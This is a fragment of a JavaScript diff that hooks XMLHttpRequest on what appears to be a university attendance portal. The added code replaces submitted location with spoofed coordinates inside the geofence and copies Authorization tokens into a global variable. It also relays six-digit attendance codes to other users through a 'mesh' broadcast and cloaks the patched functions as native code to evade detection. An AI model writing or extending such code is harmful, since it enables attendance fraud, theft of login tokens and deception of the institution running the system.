+                  _broadcastMeshOtp(String(codeVal), 'portal_fetch_form');
+                }
                 _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
               }
             } catch (_) {}
@@ -2032,18 +2427,30 @@
         }
       });
 
+      const setHeaderProxy = new Proxy(_origXHRSetHeader, {
+        apply(target, thisArg, args) {
+          if (args[0] && /^authorization$/i.test(args[0]) && args[1]) {
+            try { window.__capturedAuthToken = args[1]; } catch (_) {}
+          }
+          return Reflect.apply(target, thisArg, args);
+        }
+      });
+
       const sendProxy = new Proxy(_origXHRSend, {
         apply(target, thisArg, args) {
           let body = args[0];
           const cfg = getSpoofConfig();
           const url = thisArg._requestUrl || '';
 
-          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa/self') && typeof body === 'string') {
+          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa') && typeof body === 'string') {
             try {
               const parsed = JSON.parse(body);
               const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
               parsed.latitude  = pos.coords.latitude;
               parsed.longitude = pos.coords.longitude;
+              if (parsed.kode && /^\d{6}$/.test(String(parsed.kode))) {
+                _broadcastMeshOtp(String(parsed.kode), 'portal_xhr');
+              }
               args[0] = JSON.stringify(parsed);
               _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
             } catch (_) {}
@@ -2060,9 +2467,11 @@
       });
 
       _cloak(openProxy, 'function open() { [native code] }');
+      _cloak(setHeaderProxy, 'function setRequestHeader() { [native code] }');
       _cloak(sendProxy, 'function send() { [native code] }');
       try {
         XMLHttpRequest.prototype.open = openProxy;
+        XMLHttpRequest.prototype.setRequestHeader = setHeaderProxy;
         XMLHttpRequest.prototype.send = sendProxy;
       } catch (_) {}
     }
